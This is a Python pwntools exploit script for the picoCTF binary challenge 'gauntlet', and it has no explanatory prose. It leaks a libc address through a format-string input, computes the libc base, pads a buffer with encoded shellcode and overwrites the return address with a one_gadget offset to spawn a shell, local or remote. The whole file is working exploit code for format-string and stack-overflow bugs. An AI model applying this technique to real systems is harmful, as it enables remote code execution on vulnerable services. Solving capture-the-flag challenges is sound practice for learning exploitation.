from pwn import *

e = ELF("./gauntlet")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("mercury.picoctf.net", 33542)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})

debug()
p.sendline("%2$llx")

leak = int(p.recvline(), 16) - 0x00007faf5468f8d0  + 0x00007faf542a2000
print(hex(leak))

pay = asm(shellcraft.sh())
pay = encoders.encoder.encode(pay, avoid="\x00")
print("\x00" in pay)
pay = pay.ljust(0x78, "A") + p64(leak + 0x4f432)

p.sendline(pay)

p.interactive()
